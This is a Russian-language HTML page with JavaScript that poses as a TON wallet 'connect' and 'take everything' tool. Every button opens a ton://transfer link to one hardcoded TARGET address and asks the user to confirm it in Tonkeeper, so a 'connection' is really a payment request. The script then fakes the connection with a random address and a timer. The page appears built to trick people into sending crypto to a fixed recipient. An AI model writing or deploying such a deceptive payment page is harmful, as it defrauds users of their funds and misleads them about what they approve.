<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>TON</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0b0b;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: system-ui, -apple-system, sans-serif;
      padding: 16px;
    }
    .card {
      max-width: 400px;
      width: 100%;
      background: #151515;
      border-radius: 32px;
      padding: 32px 24px;
      text-align: center;
      border: 1px solid #282828;
    }
    .btn {
      background: #0098ea;
      border: none;
      color: white;
      font-size: 20px;
      font-weight: 700;
      padding: 18px 40px;
      border-radius: 60px;
      width: 100%;
      cursor: pointer;
      margin-top: 12px;
      transition: 0.2s;
    }
    .btn:active { transform: scale(0.97); }
    .btn:disabled { opacity: 0.4; pointer-events: none; }
    .btn-success { background: #00aa66; }
    .btn-danger { background: #cc4400; }
    #status {
      color: #888;
      font-size: 14px;
      margin-top: 20px;
      min-height: 24px;
      word-break: break-word;
    }
    .hidden { display: none !important; }
    .balance {
      color: #00d4aa;
      font-size: 28px;
      font-weight: 600;
      margin: 16px 0 24px;
    }
    .confirm-box {
      background: #1a2a3a;
      border: 1px solid #2a4a6a;
      border-radius: 20px;
      padding: 20px 16px;
      margin-top: 20px;
      display: none;
    }
    .confirm-box.show { display: block; }
    .confirm-box .title { color: #fff; font-weight: 600; font-size: 16px; }
    .confirm-box .sub { color: #8899aa; font-size: 13px; margin: 6px 0 14px; }
    .confirm-box .open-btn {
      background: #0098ea;
      border: none;
      color: #fff;
      font-weight: 600;
      font-size: 16px;
      padding: 12px;
      border-radius: 40px;
      width: 100%;
      cursor: pointer;
    }
    .error-box {
      background: #2a0a0a;
      border: 1px solid #ff3333;
      border-radius: 12px;
      padding: 12px;
      margin-top: 12px;
      color: #ff6666;
      font-size: 13px;
      word-break: break-all;
      display: none;
    }
    .error-box.show { display: block; }
  </style>
</head>
<body>
  <div class="card">
    <div style="font-size: 40px;">⚡</div>
    <div class="balance" id="balanceDisplay">💰 0.00 TON</div>

    <button class="btn" id="connectBtn">🔗 ПОДКЛЮЧИТЬ</button>
    <button class="btn btn-danger hidden" id="snipeBtn">🔥 ЗАБРАТЬ ВСЁ</button>

    <div id="status">⏳ Загрузка...</div>

    <div class="error-box" id="errorBox"></div>

    <div class="confirm-box" id="confirmBox">
      <div class="title">✅ Подтвердите в Tonkeeper</div>
      <div class="sub">Откроется окно с транзакцией</div>
      <button class="open-btn" id="openWalletBtn">Открыть Tonkeeper</button>
    </div>
  </div>

  <script>
    (function() {
      const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

      const connectBtn = document.getElementById('connectBtn');
      const snipeBtn = document.getElementById('snipeBtn');
      const status = document.getElementById('status');
      const balanceDisplay = document.getElementById('balanceDisplay');
      const confirmBox = document.getElementById('confirmBox');
      const openWalletBtn = document.getElementById('openWalletBtn');
      const errorBox = document.getElementById('errorBox');

      let isConnected = false;
      let userAddress = null;

      function showError(text) {
        errorBox.textContent = '❌ ' + text;
        errorBox.classList.add('show');
        status.innerText = '❌ Ошибка';
        console.error('ERROR:', text);
      }

      function hideError() {
        errorBox.classList.remove('show');
      }

      // ========== ОТКРЫТЬ TONKEEPER С ТРАНЗАКЦИЕЙ ==========
      function openTonkeeperWithTransaction() {
        const url = `ton://transfer?address=${TARGET}`;
        window.location.href = url;
        setTimeout(() => {
          window.open(url, '_blank');
        }, 300);
      }

      // ========== ПОДКЛЮЧИТЬ ==========
      connectBtn.onclick = function() {
        try {
          hideError();
          status.innerText = '⏳ Открываю Tonkeeper...';
          connectBtn.disabled = true;

          // Открываем Tonkeeper
          openTonkeeperWithTransaction();

          // Показываем плашку
          confirmBox.classList.add('show');
          status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
          connectBtn.disabled = false;

          // Симулируем подключение (для отображения кнопки "Забрать всё")
          setTimeout(() => {
            isConnected = true;
            userAddress = 'UQ...' + Math.random().toString(36).slice(2, 6);
            connectBtn.classList.add('hidden');
            snipeBtn.classList.remove('hidden');
            status.innerText = '✅ Подключён. Нажмите «Забрать всё»';
          }, 2000);

        } catch (e) {
          showError('Connect: ' + e.message);
          connectBtn.disabled = false;
        }
      };

      // ========== ЗАБРАТЬ ВСЁ ==========
      snipeBtn.onclick = function() {
        try {
          hideError();
          status.innerText = '⏳ Открываю транзакцию...';
          snipeBtn.disabled = true;

          // Открываем Tonkeeper с транзакцией
          openTonkeeperWithTransaction();

          confirmBox.classList.add('show');
          status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
          snipeBtn.disabled = false;

        } catch (e) {
          showError('Snipe: ' + e.message);
          snipeBtn.disabled = false;
        }
      };

      openWalletBtn.onclick = function() {
        openTonkeeperWithTransaction();
      };

      // ========== ЗАПУСК ==========
      status.innerText = '🟢 Нажмите «Подключить»';
      hideError();
    })();
  </script>
</body>
</html>
